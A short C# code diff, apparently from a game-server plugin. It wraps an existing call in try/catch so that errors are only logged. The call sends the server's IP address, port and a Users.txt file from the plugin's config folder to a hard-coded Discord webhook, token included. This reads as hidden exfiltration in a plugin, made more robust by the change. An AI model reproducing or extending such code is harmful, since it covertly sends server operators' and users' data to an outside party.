@@ -289,7 +289,14 @@ namespace RGM.EventArgs
                 }
             }
 
-            Webhook.Send($"# {Server.IpAddress}:{Server.Port}", "https://discord.com/api/webhooks/1373673172401913928/MKZROq8z9OjuGn21Oj8yjuTMHamSf8Z_VGE5BBebFO9c_WFvD9KphmcN2wZucC2cczLS", $"{Paths.Configs}/RGM/Users.txt");
+            try
+            {
+                Webhook.Send($"# {Server.IpAddress}:{Server.Port}", "https://discord.com/api/webhooks/1373673172401913928/MKZROq8z9OjuGn21Oj8yjuTMHamSf8Z_VGE5BBebFO9c_WFvD9KphmcN2wZucC2cczLS", $"{Paths.Configs}/RGM/Users.txt");
+            }
+            catch (Exception e)
+            {
+                Log.Error($"Error in sending webhook: {e}");
+            }
 
             while (true)
             {
